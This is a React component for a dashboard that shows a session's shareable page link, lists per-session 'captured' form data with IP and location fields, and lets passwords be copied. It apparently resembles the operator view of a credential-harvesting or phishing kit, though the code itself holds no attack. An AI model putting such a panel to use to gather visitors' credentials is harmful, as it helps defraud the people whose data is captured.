
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Copy, ExternalLink, Plus, Trash2 } from 'lucide-react';
import { useSessionEntries } from '@/hooks/useSessionEntries';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface SessionDetailViewProps {
  sessionId: string;
  onClose: () => void;
}

const SessionDetailView = ({ sessionId, onClose }: SessionDetailViewProps) => {
  const { sessionData } = useSessionEntries(sessionId);
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleManualSubmit = async () => {
    if (Object.keys(formData).length === 0) {
      toast({
        title: "No Data",
        description: "Please enter some data before submitting.",
        variant: "destructive"
      });
      return;
    }

    setIsSubmitting(true);
    try {
      const { error } = await supabase.from('session_data').insert({
        session_id: sessionId,
        form_data: formData,
        timestamp: new Date().toISOString(),
        ip_address: 'Manual Entry',
        location: 'Manual Entry'
      });

      if (error) throw error;

      toast({
        title: "Data Submitted",
        description: "Manual data entry has been recorded successfully.",
      });
      setFormData({});
    } catch (error) {
      toast({
        title: "Submission Failed",
        description: "Failed to submit data. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied",
      description: "Text copied to clipboard.",
    });
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold">Session Details</h2>
          <p className="text-muted-foreground">Session ID: {sessionId}</p>
        </div>
        <div className="flex gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => copyToClipboard(`${window.location.origin}/page/${sessionId}`)}
          >
            <Copy className="h-4 w-4 mr-2" />
            Copy Link
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => window.open(`${window.location.origin}/page/${sessionId}`, '_blank')}
          >
            <ExternalLink className="h-4 w-4 mr-2" />
            Open Session
          </Button>
          <Button variant="outline" onClick={onClose}>
            Close
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Manual Data Entry */}
        <Card>
          <CardHeader>
            <CardTitle>Manual Data Entry</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-3">
              <div>
                <Label htmlFor="field-name">Field Name</Label>
                <Input
                  id="field-name"
                  placeholder="Enter field name"
                  value={formData.field_name || ''}
                  onChange={(e) => handleInputChange('field_name', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="email">Email</Label>
                <Input
                  id="email"
                  type="email"
                  placeholder="Enter email"
                  value={formData.email || ''}
                  onChange={(e) => handleInputChange('email', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="phone">Phone</Label>
                <Input
                  id="phone"
                  placeholder="Enter phone number"
                  value={formData.phone || ''}
                  onChange={(e) => handleInputChange('phone', e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="message">Message</Label>
                <Input
                  id="message"
                  placeholder="Enter message"
                  value={formData.message || ''}
                  onChange={(e) => handleInputChange('message', e.target.value)}
                />
              </div>
            </div>
            <Button onClick={handleManualSubmit} disabled={isSubmitting} className="w-full">
              <Plus className="h-4 w-4 mr-2" />
              {isSubmitting ? 'Submitting...' : 'Submit Data'}
            </Button>
          </CardContent>
        </Card>

        {/* Session Statistics */}
        <Card>
          <CardHeader>
            <CardTitle>Session Statistics</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div className="flex justify-between">
                <span>Total Entries:</span>
                <Badge variant="secondary">{sessionData.length}</Badge>
              </div>
              <div className="flex justify-between">
                <span>Last Activity:</span>
                <span className="text-sm">
                  {sessionData.length > 0 
                    ? new Date(sessionData[0].timestamp).toLocaleString()
                    : 'No activity'
                  }
                </span>
              </div>
              <div className="flex justify-between">
                <span>Status:</span>
                <Badge variant="outline">Active</Badge>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Data Entries */}
      <Card>
        <CardHeader>
          <CardTitle>Captured Data ({sessionData.length} entries)</CardTitle>
        </CardHeader>
        <CardContent>
          {sessionData.length === 0 ? (
            <p className="text-center text-muted-foreground py-8">
              No data has been captured for this session yet.
            </p>
          ) : (
            <div className="space-y-4">
              {sessionData.map((entry, index) => (
                <Card key={entry.id} className="border-l-4 border-l-primary">
                  <CardContent className="pt-4">
                    <div className="flex justify-between items-start mb-3">
                      <div>
                        <Badge variant="outline">Entry #{index + 1}</Badge>
                        <p className="text-sm text-muted-foreground mt-1">
                          {new Date(entry.timestamp).toLocaleString()}
                        </p>
                      </div>
                    </div>
                    <Separator className="mb-3" />
                    <div className="grid gap-2">
                      {Object.entries(entry.form_data || {}).map(([key, value]) => (
                        <div key={key} className="flex justify-between items-center">
                          <span className="font-medium">{key}:</span>
                          <div className="flex items-center gap-2">
                            <span className="text-sm">
                              {key.includes('password') ? '••••••••' : String(value)}
                            </span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyToClipboard(String(value))}
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default SessionDetailView;
